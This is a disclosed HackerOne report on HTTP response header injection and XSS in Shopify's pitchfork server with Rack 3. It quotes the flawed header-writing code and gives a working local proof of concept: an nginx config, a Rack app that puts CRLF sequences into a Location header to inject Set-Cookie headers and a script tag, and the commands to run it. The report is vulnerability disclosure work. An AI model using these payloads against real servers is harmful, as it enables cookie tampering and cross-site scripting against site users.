# HTTP Response Header Injection in shopify/pitchfork + Rack 3

## Report Details
- **Report ID**: 2279572
- **URL**: https://hackerone.com/reports/2279572
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-12-10T06:13:31.895Z
- **Disclosed**: 2025-03-27T14:37:52.299Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
I have confirmed HTTP response header injection and XSS in combination of [pitchfork](https://github.com/Shopify/pitchfork) + Rack 3.

Here's where the problem is in the code.

https://github.com/Shopify/pitchfork/blob/v0.10.0/lib/pitchfork/http_response.rb#L23C1-L33C8

```ruby
    def append_header(buf, key, value)
      case value
      when Array # Rack 3
        value.each { |v| buf << "#{key}: #{v}\r\n" }
      when /\n/ # Rack 2
        # avoiding blank, key-only cookies with /\n+/
        value.split(/\n+/).each { |v| buf << "#{key}: #{v}\r\n" }
      else
        buf << "#{key}: #{value}\r\n"
      end
    end
```    

When using Rack 3, `\n` contained in value will be displayed as is in the output.

---


## PoC

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ cat Gemfile
# frozen_string_literal: true

source "https://rubygems.org"

gem 'pitchfork', '~> 0.10.0'%

❯ bundle install
=> install rack (3.0.8)
```

nginx.conf

```
events {
    worker_connections  16;
}
http {
    server {
        listen 80;
        server_name localhost;

        location / {
            proxy_pass http://host.docker.internal:3000/;
            
            proxy_redirect off;
        }
    }
}
```

injection.ru

```ruby
class PitchForkHeaderInjection
  def call(env)
    params =  Rack::Request.new(env).params
    location = if params["mode"] == "rn"
                 ["a\r\nSet-cookie: injected=value"]
               elsif params["mode"] == "r"
                 ["b\rSet-cookie: injected_2=value2"]
               elsif params["mode"] == "n"
                 ["c\nSet-cookie: injected_3=value3"]
               elsif params["mode"] == "b"
                 ["d\r\n\r\n<script>alert(location)</script>"]
               else 
                  [""]
               end

    [ 200,
      {
       'content-type' => 'text/html',
        'location' => location
        },
      [""]
    ]
  end
end

run PitchForkHeaderInjection.new
```

Start server

```
❯ docker run --name pitchfork_header -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf:ro -d -p 8080:80 nginx 

❯ RACK_ENV=production bundle exec pitchfork -p 3000 injection.ru
# If RACK_ENV=production is not present, an error will occur due to Rack::Lint.
```


### Access from browser

http://localhost:8080/?mode=rn 

{F2913343}

http://localhost:8080/?mode=r

{F2913344}

http://localhost:8080/?mode=n

{F2913345}

Cookie status

{F2913347}

Header injection succeeds in case of `r\n` and `\n`. If only `\r`, nginx will prevent it.


http://localhost:8080/?mode=b

{F2913349}

Since `r\n` can be inserted, the response body can also be spoofed and XSS will be fired.

## Impact

If attacker can manipulate the redirect destination or cookie value, HTTP response header injection and XSS is possible.
(Past cases https://hackerone.com/reports/904059#activity-8945588 )

In the case of Rack 2, the value of `\n` is not included, and nginx prevents `\r`, so it is not treated as a vulnerability.
(Discussion on Unicorn https://yhbt.net/unicorn-public/20210226111552.GA22901@dcvr/T/#t )

## Attachments
- mode_rn.png
- mode_r.png
- mode_n.png
- injected_cookie.png
- mode_b.png
